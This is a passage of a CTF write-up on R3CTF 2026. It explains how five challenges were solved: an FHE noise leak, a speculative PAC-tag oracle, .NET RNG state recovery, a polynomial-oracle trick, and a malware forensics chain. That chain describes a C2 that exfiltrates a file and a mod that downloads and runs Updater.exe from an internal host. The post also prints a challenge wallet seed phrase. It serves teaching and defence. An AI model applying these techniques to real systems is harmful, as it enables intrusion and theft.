**FHE libraries don’t inherently leak; applications do.** HEuristic uses Microsoft SEAL exactly as documented, but the challenge server chooses to reveal 96 composed coefficients with a noise magnitude smaller than the modulus. Any FHE deployment has to reason explicitly about “what does the application allow the querier to observe about the encrypted values,” because the safe usage of CKKS is “return an encrypted result, not a decrypted plaintext.” Once decryption results are exposed with too-small noise, an attacker who can control plaintext structure (as here, via a chosen encrypt call) can solve for hidden multipliers.

**Speculative execution needs to be part of the security model, not an afterthought.** Blinky’s PAC gate is architecturally correct (a bad tag on the committed path raises a fault and locks the gate), but the design does not consider what a wrong-path load can do. Real hardware has learned this lesson at scale: Meltdown, Spectre, MDS, LVI, Retbleed, all boil down to “an authenticated check on the committed path is not an authenticated check on the speculative path unless you serialise or tag.” Every hardware security review needs a pass explicitly for wrong-path effects.

**Fast PRNGs are state-recoverable from enough public outputs.** mafuyuuuuu’s `System.Random` = `xoshiro256**` is a 2^256-period generator that many callers assume is secure. It is not: 9 to 16 outputs plus a MITM recovers the whole state. The same is true of Java’s `xoshiro128++`, Python’s `PCG64` before 3.13’s `os.urandom`-seeding fixes, and every other non-cryptographic PRNG. Any authorisation decision that hinges on unpredictability needs `RandomNumberGenerator` / `secrets` / `os.urandom`; a “just use `Random.Next`” defence loses to any attacker who can collect a few consecutive outputs from a public endpoint.

**Interpolation helpers evaluated outside their domain are linear-equation oracles.** r3ticket’s `get_num` is a Lagrange basis: safe on `[0, 127]`, catastrophic on `-K`. The general pattern applies to any polynomial-evaluation service (Shamir secret sharing, error-correcting codes, PSI protocols): if the evaluation point is not tightly bound, the output is a known linear combination of the coefficients and can be extracted via appropriate integer or field arithmetic. Domain-check every polynomial evaluation, including “obviously safe” ones like negative indices.

**RDP bitmap caching is a shoulder-surfing artefact.** Tsuki’s uses ANSSI’s `bmc-tools` on a `Cache0000.bin` starting with `RDP8bmp` to reconstruct exactly what an attacker saw on the remote desktop. The client-side cache is per-user and holds visible screen tiles until eviction. For defenders: any incident-response bundle that pulls a workstation’s `%LOCALAPPDATA%\Microsoft\Terminal Server Client\Cache\` might reveal every credential, wallet key, or medical record the user displayed via RDP. Disable persistent bitmap caching on any client that connects to sensitive session hosts.

## Frequently asked questions[#](#frequently-asked-questions)

### What is R3CTF 2026?[#](#what-is-r3ctf-2026)

R3CTF 2026 is a CTF run by r3kapig, a top-tier Chinese CTF team. The challenges span crypto, misc/hardware, web, forensics, and other categories. Flag prefix `r3ctf{...}`. This writeup covers the five challenges I solved. Per-challenge READMEs, artifacts, and solver scripts are mirrored at [Abdelkad3r/R3CTF-2026](https://github.com/Abdelkad3r/R3CTF-2026).

### Why does HEuristic’s 188-bit noise leak the 240-bit `delta`?[#](#why-does-heuristics-188-bit-noise-leak-the-240-bit-delta)

Each observed leak is `leak_i = m_i · delta + noise_i (mod q)` with `q ≈ 2^240` and `|noise_i| < B ≈ 2^188`, so each leak carries about 52 bits of information about `delta`. Encrypting a plaintext with a baseline `q/2` in slot 0 and `q/2 + 2^e` in slot e cancels the baseline via subtraction: `d_e = leak_e - leak_0 = 2^e · delta + (noise_e - noise_0) (mod q)`. 95 such approximate modular equations for the same `delta` allow interval-refinement over `delta ∈ [1, q)` to narrow candidates to ~3, then a baseline-noise-intersection filter (`noise_0` appears in every equation) picks the exact value.

### How does the PAC bypass in Blinky avoid committing a PAC fault?[#](#how-does-the-pac-bypass-in-blinky-avoid-committing-a-pac-fault)

The architectural PAC gate on indirect jumps into kernel space raises a fault on any wrong tag, and one committed fault locks the gate permanently. The exploit never commits a PAC fault. Instead, it uses a PAC-gated data-load whose behavior on the *wrong speculative path* differs by tag: bad tag suppresses the fault (because speculative squashed instructions don’t commit exceptions), good tag touches `PAC_PROBE_ADDR` and leaves a cache footprint. Training a BHT-alias branch as not-taken makes the oracle branch mispredict, so the PAC-gated load runs on the wrong path. Timing a subsequent load from the probe address distinguishes cache hit (good tag) from miss (bad tag). Iterate 256 tags without committing a single fault, confirm with a second probe, then execute the authenticated `jr` on the committed path.

### Why can mafuyuuuuu’s `System.Random` be recovered from 160 leaked outputs?[#](#why-can-mafuyuuuuus-systemrandom-be-recovered-from-160-leaked-outputs)

On .NET 8 x64, `System.Random` is `xoshiro256**`: `result = rotl(s1 · 5, 7) · 9 (mod 2^64)`. `Random.Next(0, 2^31-1)` takes the high 32 bits and applies a bounded reduction. Inverting the bounded reduction gives a few possible high-32-bit outputs `x`; peeling back the `· 9`, rotate, and `· 5` gives 76 possible 34-bit slices `s1[23..56]` per leak. The state transition is linear over GF(2), so 9 leaked slice-choices provide 306 GF(2) equations in the 256-bit initial state. With rank 256, that leaves 50 parity dependencies. A MITM on the syndromes reduces the enumeration to ~76^5 lookups × ~76^4 buckets; a lifted state validates against the full 160-leak sequence.

### What is the base-K polynomial trick in r3ticket?[#](#what-is-the-base-k-polynomial-trick-in-r3ticket)

`get_num(nums, index)` is a Lagrange interpolation basis. For `0 ≤ index ≤ 127` it returns `nums[index]`; for `index > 127` it returns 0; for negative `index = -K` it returns `sum_i L_i(-K) · nums[i]`, a known linear combination. Denominators divide `127!`, so multiplying the response by `D = 127!` gives an integer polynomial `sum_k C_k · K^k` where each `C_k` is a linear form in the 128 unknowns. Pick `K` larger than every possible `|C_k|` (a 351-digit value works), so base-`K` balanced-remainder decoding cleanly separates the coefficients. That produces 128 linear equations in 128 unknowns from a single oracle query. Rank 127 mod 1000003 leaves a 1-D nullspace; enumerate one coordinate 0-65535 and keep the unique point where all 128 coords fit in 16 bits.

### How does the C2 protocol in Tsuki’s Rhythm Game encode messages?[#](#how-does-the-c2-protocol-in-tsukis-rhythm-game-encode-messages)

The first client-to-server message is `hh.exe` XORed with the repeating key `13 37 c0 de`, exfiltrating the file to the C2 server. All subsequent messages are dot-separated integers: positive integers index into a dictionary built from the first occurrence of each byte value in `hh.exe`, and negative integers escape byte values that don’t appear in `hh.exe` (248 of 256 byte values do appear; 8 don’t). Decoding one packet: split on `.`, look up each positive int in the dictionary, decode each negative int as `abs(value)`, concatenate to bytes `16-byte key || AES-128-CBC ciphertext || 16-byte IV`, decrypt with PKCS#7. The whole primitive is a rebuild-the-dictionary-from-a-known-file trick: since the attacker XOR-uploads `hh.exe` at session start, the responder can reconstruct the same lookup table.

### Why does the marshalled bytecode in Eggdrasil.tsuki come from type-99 notes?[#](#why-does-the-marshalled-bytecode-in-eggdrasiltsuki-come-from-type-99-notes)

The rhythm game loads AES-encrypted beatmaps and Python-based mods. `advanced_stats.tsukimod` iterates over all notes in a chart, filters for `type == 99`, packs each note’s lane into 2 bits, concatenates them into a bytes object, and calls `marshal.loads` on the result. That gives the mod a covert code-loading channel through what looks like a normal chart file. Any beatmap that contains enough type-99 notes to encode a marshalled function object can execute arbitrary Python when loaded through this mod. The `custom_compare` function it installs downloads `Updater.exe` from `192.168.117.1:8000` and runs it.

### How do you get from the encrypted Evidence.zip to a MetaMask recovery phrase?[#](#how-do-you-get-from-the-encrypted-evidencezip-to-a-metamask-recovery-phrase)

Answering the C2-analysis questions on the challenge instance unlocks the ZIP password `18ae3a54-1c1a-4f44-adca-9884acb80d9a`. The archive contains `Cache0000.bin` starting with `RDP8bmp`, an RDP bitmap cache from the attacker’s client that recorded the tiles displayed on the remote session. ANSSI’s `bmc-tools` extracts and collages 2,943 tiles; among them, the MetaMask recovery-phrase entry boxes are visible with the words `labor trophy emerge material divorce input faint bench cricket merge sunset cream`. `cast wallet derive 'labor trophy emerge material divorce input faint bench cricket merge sunset cream' --accounts 1` produces `0x27A2481a2D840C64c1f6a99842E1A63A1586237e`, the answer wallet.

### Why does the mafuyuuuuu exploit need 48 debug attempts?[#](#why-does-the-mafuyuuuuu-exploit-need-48-debug-attempts)

The `InternalHealthProbeService` starts 3 seconds after boot and consumes 3 RNG values every 5 seconds via `RecordHealthProbe`. By the time the solver has collected 160 leaks, run MITM (~20s), and posts a debug template, the RNG has advanced by some unknown multiple of 3. The template sandbox allows up to 48 output expressions per render. Fire 48 debug attempts with predicted output indices `4*t` for `t = 0..47`: call `t` consumes predicted index `3·t` (health probe advance) `+ t` (previous failed debug ticks) `= 4·t`. One of the 48 lands on the correct current RNG position and executes `/readflag`.

### What’s the broader lesson from the R3CTF 2026 track?[#](#whats-the-broader-lesson-from-the-r3ctf-2026-track)

Every challenge dresses a classical primitive in a modern wrapper. FHE + CKKS on top of “return the delta.” MIPS64 + PAC on top of “call an address.” xoshiro256\*\* on top of “guess my ticket.” Lagrange bases on top of “read one array element.” RDP bitmap caching on top of “recover the recovery phrase.” Recognising the primitive is the whole game; once named, the exploit is a Python solver of at most a few dozen top-level lines (with a C++ helper for the tight inner loop where needed). The general defensive lesson: any modern framework, hardware feature, or library that layers convenience over a classical cryptographic or algorithmic primitive inherits that primitive’s failure modes, and the “modern wrapper” often removes the safety rails the classical form had.

### Where can I find the solver scripts?[#](#where-can-i-find-the-solver-scripts)

Per-challenge READMEs, artifacts, and Python + C++ solver scripts are at [Abdelkad3r/R3CTF-2026](https://github.com/Abdelkad3r/R3CTF-2026). Each challenge directory has a `solve.py` (or `exploit.s` + `exploit.mem` for Blinky) that reproduces the flag against a fresh instance. mafuyuuuuu and r3ticket also ship C++ helpers (`mitm9.cpp`, `scan_exp.cpp`) that the Python drivers compile automatically. HEuristic and Tsuki’s are pure Python.

## Closing notes[#](#closing-notes)

Five challenges, five classical primitives modernised. HEuristic uses Microsoft SEAL as documented and still leaks the secret multiplier through decrypted-coefficient noise that’s smaller than the modulus. Blinky presents pointer authentication as a serious mitigation and still leaks tag bits through a Spectre-style speculative path. mafuyuuuuu treats `Random` as an unpredictable ticket source and still loses the RNG state in 160 outputs plus a MITM. r3ticket dresses a Lagrange interpolation basis as a safe array-lookup helper and still gives up all 128 secrets from a single negative-index oracle call. Tsuki’s chains PyInstaller + AES + marshalled bytecode + custom C2 + RDP bitmap cache into a five-stage forensics ladder whose end rung is a MetaMask recovery phrase visible in reconstructed screen tiles. Every solve is a Python one-shot once the classical primitive is named.

For more crypto writeups on this site, the [NoHackNoCTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/nohacknoctf-2026-writeup/) covers AES-CTR keystream reuse and an ECDSA nonce-prefix HNP that structurally rhymes with HEuristic’s noisy-linear-equation solve. The [SEKAI CTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/sekai-ctf-2026-writeup/) walks the `Untitled Encore` reverse challenge (embedded eBPF VM) that shares the “modern wrapper over a classical primitive” pattern. For hardware-adjacent material, the [LYKNCTF crack writeup](https://cybersecurityelite.com/ctf-writeups/lyknctf-2026-crack-writeup/) covers a KMDF driver + TCC binary + control-flow-flattened checker set. For web-track RNG recovery, the [LYKNCTF web writeup](https://cybersecurityelite.com/ctf-writeups/lyknctf-2026-web-writeup/) walks AES-CBC padding oracle (CBC-R) plus a five-stage SSRF → HMAC forge → Jinja2 SSTI chain. The paired [LYKNCTF forensics writeup](https://cybersecurityelite.com/ctf-writeups/lyknctf-2026-forensics-writeup/) covers PNG-metadata XOR stego + JPEG-with-ZIP-append + on-chain USDT tracing. Full [CTF writeups index](https://cybersecurityelite.com/ctf-writeups/) for everything else.

### Join the CyberSecurity Elite newsletter

Weekly writeups, tools, and tactics — straight to your inbox. No spam, unsubscribe anytime.

Email address

Subscribe